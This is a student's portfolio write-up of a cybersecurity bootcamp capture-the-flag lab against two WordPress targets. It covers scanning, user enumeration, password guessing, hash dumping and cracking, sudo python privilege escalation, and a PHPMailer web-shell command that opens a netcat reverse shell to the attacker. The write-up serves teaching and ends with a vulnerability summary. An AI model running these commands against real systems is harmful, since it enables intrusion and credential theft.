---
title: Final Project
layout: default
description: The final project from my Cybersecurity course demonstrates aspects of offensive security, defensive security, as well as some network analysis.
<!-- repository: https://github.com/lithrion/ELK-Stack-Project -->
---

# Final Porject
The final project of the cybersecuirty boot camp that I took through UCSD extension consisted of three parts.
- Defensive Security
- Offensive Security
- Network Analysis

## Overview
The defensive security part of the project involved setting up a few rules on an ELK stack using Kibana to detect suspicious activity. Then after completing the offensive portion of the project, we returned to the ELK stack to review the logs of the suspicious activity that occured.

The offensive security portion of the project was a capture the flag type activity where we exploited vulnerabilities on the machine that the ELK stack was monitoring.

The network analysis portion of the project was independent of the offensive/defensive sections, and involved analysis a PCAP file for suspicious activity.

## Network Topology

The image below shows the topology of the network that was used during this project. Target1 and Target2 were the focus of the offesnive security portion of the project. The defensive portion focused on the ELK server, which was observing Target 1 and Target2. The Capstone machine was part of another project, and the network anaylsis portion of the project was independnet of this network.
![Network Topology](/images/class-projects/final/topology.jpg)


## Offensive Security

The Offensive Security portion of the project was a capture the flag activity where the goal was to capture the flags on both Target1 and Target2.

### Target 1 - 192.168.1.110
*Objective:* Gain root access on the machine finding 4 Flags along the way.

#### Reconnasiance
A nmap scan of the target revealed a handful of open ports, including port 80 for http traffic.
`nmap -sV 192.168.1.110`
![nmap SCan](/images/class-projects/final/nmap.jpg)

Visiting 192.168.1.110 in a web browser revealed some general information about the company that the website was for, including some employee names and positions. Inspecting the source code of the website revealed the first flag inside one of the webpages.

Delving a little deeper into the structure of the website, running DirBuster revealed some addition files and directories. This included a login page, and well as indicating that the website was build using wordpress.

#### Enumerating Users

As the first step towards gaining login credentials, I used WPScan in order to enumerate usernames.
`wpscan --url http://192.168.1.110/wordpress --force`
Which came up with two results.
~[WPScan Results](/images/class-projects/final/wpscan.jpg)

#### A Foothold

Another open port from the nmap scan back at the beginning was 22, or ssh. It turned out Michael had a terribly weak password, it was the same as his username. Which made for a pretty quick way to gain access to the machine without even requiring any additional tools.
`ssh Michael@192.168.1.110`

Once logged in, looking around a little found Flag2 inside the `/var/www` directory. Looking a little further found a useful config file, `wp-config.php` located at `/var/www/html/wordpress`
![WP Config](/images/class-projects/final/wpconfig.jpg)

Inside the configuration was were the credentials for a MySQL database.

#### mySQL Database
Inside the mySQL database using
`show databases;`
`show tables;`
Displayed the wordpress tables and then
` select * from wp_users;`
revealed both Michael and Steven's password hashes.

The database also contained Flag3.

#### John the ripper
By exporting the two hashes from the database into a text file, John the Ripper was able to crack one of the two hashes. This gave Steven's password, pink84.
`john hashes.txt`
~[John the Ripper](/images/class-projects/final/john.jpg)

#### Privilege Escalation
After switching users to Steven, I checked his sudo access.
`sudo -l`
~[sudo access](/images/class-projects/final/sudo.jpg)
and saw that he has sudo access for python. That's certainly an issue considering python can execute commands including things like creatinga new bash shell.

After writing a quick little privilege escalations script
~[Privesc.py](/images/class-projects/final/privesc.jpg)
I ran that script as root
`sudo python privesc.py`
which created a new shell as root.
~[root](/images/class-projects/final/root.jpg)

Flag4 was inside root's home directory, and was the final objective for Target1.

### Target 2 192.168.1.115
This goal on this machine was only to gain user access, although it did take a little more work to get there.

#### Reconassiance
This machine started off similarly with a nmap scan `nmap -sV 162.168.1.115` and then running DirBuster.
~[DirBuster](/images/class-projects/final/dirbuster2.jpg)

This revealed the directory `192.168.1.115/vendor/PATH` which contained Flag1.

#### Mail PHP Remote Code Execution
For the next step, we were actually provided with a script for the exploit, but I did a little bit of research on it to see how it works.

In the PHP mailer being used, there are five paramaters used by the mail function. The `to`, `subject`, and `message` paramaters are required paramaters, and `additional headers` and `additional_parameters` are two optional paramaters. It's the 5th paramater, the option `additional_parameters` that's interesting for exploitation purposes.

By creating a mail message with a carefully crafted 5th parameter an aritrary file could be written onto the server. In this case it was used to write a file that enabled a php command injection attack.

First, netcat was used to start a listener. `nc -lnvp 4444` and then the php command injection was used to open a back door.
`192.198.1.115/backdoor.php?cmd=nc%20192.168.1.90%204444%20-e%20/bin/bash`

That connection immediately revealed Flag2
~[Flag2](/images/class-projects/final/flag2.jpg)

Flag3 was located with a find command
`find /var/www -type f -iname 'flag*'
![flag3](/images/class-project/final/flag3.jpg)
as a png image, which was view in a web browser
`192.168.1.115/wordpress/wp-content/uploads/2018/11/flag3.png`

Which was the final flag of the activity.

#### Summary
##### Target 1
*Vulnerabilities:*
- Weak Password Policy
- Directory Transversal
- Insecure SSH
- Insecure Wordpress Config
- Improper Sudo Privileges

Weak passwords came up a couple times on this machine. Michael's password was guessable, and the password hashes found in the mySQL database were unsalted.

A good deal of the file structure for the webserver was unnecessairly visable.

While it wasn't needed for this exercise, the version of SSH on the target was outdated and has vulnerabilities associated with it.

The Wordpress configuration files that was accessed to gain the mySQL database credentials should not have been accessable on Michael's account.

Sudo was improperly configured for Steven's account, allowing sudo access to a program that should not have sudo access. This was ultimately how root access was obtained.

## Defensive Security





